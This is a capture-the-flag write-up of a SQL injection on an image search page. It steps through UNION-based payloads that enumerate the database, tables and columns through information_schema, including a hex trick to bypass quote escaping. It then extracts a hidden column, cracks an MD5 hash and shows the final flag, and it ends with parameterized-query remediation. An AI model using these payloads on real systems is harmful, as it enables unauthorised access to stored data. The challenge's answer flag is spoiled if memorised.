# 🚩 5 : SQL Injection (Image Search)

---

## 📝 Overview

This breach demonstrates a second instance of SQL Injection, this time on
the image search page. The vulnerability is identical in nature to the member
search breach — unsanitized user input inserted directly into a SQL query —
but targets a completely different database and table structure.

Finding the same vulnerability twice across different pages highlights a
systemic problem: the developers applied no consistent input sanitization
across the application.

---

## 🔍 The Vulnerability: Unsanitized SQL Input

The image search page builds a query like:

```sql
SELECT title, url FROM list_images WHERE id = [YOUR INPUT]
```

User input lands directly in the WHERE clause without quotes or
sanitization, making it injectable in exactly the same way as the
member search page.

### Confirmation

| Input | Result | What it means |
|-------|--------|---------------|
| `1` | Returns one image | Normal behavior |
| `1 OR 1=1` | Returns all 5 images | Database executes our logic |
| `1 AND 1=2` | Returns nothing | Confirms logical control |

---

## 🛠 The Exploit Path

### Step 1: Find the Column Count

The page displays `Title` and `Url` for each result — 2 visible fields.
We confirm with:

```
1 UNION SELECT null, null--
```

No error + extra empty row → **2 columns confirmed**.

### Step 2: Find the Database Name

```
1 UNION SELECT database(), null--
```

Result: `Member_images`

Each page on this application connects to its own separate database,
named after the challenge it belongs to.

### Step 3: Map the Tables

```
1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema = database()--
```

Result: `list_images`

One table in this database.

### Step 4: Find the Columns

Converting `list_images` to hex to bypass quote escaping:

```
list_images → 0x6c6973745f696d61676573
```

```
1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 0x6c6973745f696d61676573--
```

Result:
```
id, url, title, comment
```

`comment` stands out — `id`, `url`, and `title` are all expected fields
for an image table. A comment field hidden from the UI is suspicious.

### Step 5: Extract the Hidden Data

```
1 UNION SELECT comment, null FROM list_images--
```

The last row returned:

```
If you read this just use this md5 decode lowercase then sha256 to win this flag !
: 1928e8083cf461a51303633093573c46
```

Same pattern as the member breach — instructions and an MD5 hash hidden
in a column that is never displayed to the user on the normal interface.

### Step 6: Crack the Hash and Follow the Instructions

`1928e8083cf461a51303633093573c46` → **MD5 hash** (32 hex characters).

Cracked using CrackStation:
```
1928e8083cf461a51303633093573c46 → albatroz
```

Following the instructions:
1. Lowercase → `albatroz` (already lowercase)
2. SHA256 hash → flag

```bash
echo -n "albatroz" | sha256sum
```

---

## 🏁 Result

```
FLAG: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

---

## 🌍 Real-World Impact

Same critical impact as any SQL injection — see breach #3 for full details.
The additional concern here is the **systemic nature** of the vulnerability:

**Systemic Failure**
Finding the same vulnerability on multiple pages means the developers had
no shared sanitization layer or framework protection. Every page that
touches a database is potentially vulnerable, meaning an attacker who
finds one injectable field has a strong signal to look for more.

**Hidden Data Exposure**
The `comment` column was never displayed on the normal UI — users had no
idea it existed. This is a reminder that SQL injection doesn't just expose
what you can see on screen. It exposes everything in the database,
including fields the developer never intended to be public.

---

## 🛡️ Remediation Strategies

### 1. Use Parameterized Queries Everywhere

The fix is identical to breach #3 — prepared statements must be applied
consistently across every database query in the application, not just
on some pages:

```php
// VULNERABLE
$query = "SELECT title, url FROM list_images WHERE id = " . $_GET['id'];

// SECURE
$stmt = $pdo->prepare("SELECT title, url FROM list_images WHERE id = ?");
$stmt->execute([$_GET['id']]);
```

### 2. Use a Shared Data Access Layer

Instead of writing raw SQL queries on every page, route all database
access through a single shared layer that enforces parameterization
by default. This prevents developers from accidentally writing
vulnerable queries on new pages.

### 3. Remove Sensitive Data from the Database

If a column like `comment` contains instructions or secrets, it should
not exist in a production database at all. Development notes and hints
must never make it into production systems.

### 4. Never Expose Database Errors

Same as breach #3 — raw error messages reveal query structure and
database type to attackers. Always catch and log errors privately.

---

## 📊 Attack Chain Summary

```
1. Probe field          →  1 OR 1=1 returned all 5 image rows
2. Confirm injection    →  multiple rows returned instead of 1
3. Find column count    →  UNION SELECT null, null-- → 2 columns
4. Find database name   →  database() → Member_images
5. Find table name      →  information_schema.tables → list_images
6. Find column names    →  information_schema.columns → id, url, title, comment
7. Extract hidden data  →  comment had instructions + MD5 hash
8. Crack MD5            →  1928e8083cf461a51303633093573c46 → albatroz
9. Follow instructions  →  already lowercase → SHA256 → flag
```
